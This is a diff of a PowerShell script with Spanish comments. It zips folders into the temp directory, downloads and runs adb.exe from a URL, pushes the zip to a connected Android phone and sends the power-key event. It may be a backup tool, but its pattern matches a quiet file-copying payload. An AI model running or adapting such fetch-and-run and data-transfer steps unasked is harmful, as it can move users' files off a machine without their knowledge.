@@ -1,5 +1,4 @@
 $user = $env:USERNAME
-
 $destinationPath = Join-Path $env:TEMP "BackupFolders"
 $zipFilePath = Join-Path $env:TEMP "BackupFolders.zip"
 
@@ -30,14 +29,16 @@ Invoke-WebRequest -Uri $adbZipUrl -OutFile $adbZipPath
 
 Expand-Archive -Path $adbZipPath -DestinationPath $env:TEMP -Force
 
-$adbExecutable = Join-Path $env:TEMP "adb.exe"
+# Ejecutar adb.exe para que se inicie y detecte el dispositivo conectado
+Start-Process -FilePath $env:TEMP\adb.exe -NoNewWindow -Wait
 
 $androidDestinationPath = "/storage/emulated/0/Documents"
 
 if (Test-Path $zipFilePath) {
-    & $adbExecutable push "$zipFilePath" "$androidDestinationPath"
+    & $env:TEMP\adb.exe push "$zipFilePath" "$androidDestinationPath"
 } else {
     Write-Host "Error: El archivo ZIP no existe en la ubicación especificada."
 }
 
-& $adbExecutable shell input keyevent 26
+& $env:TEMP\adb.exe shell input keyevent 26
+Exit
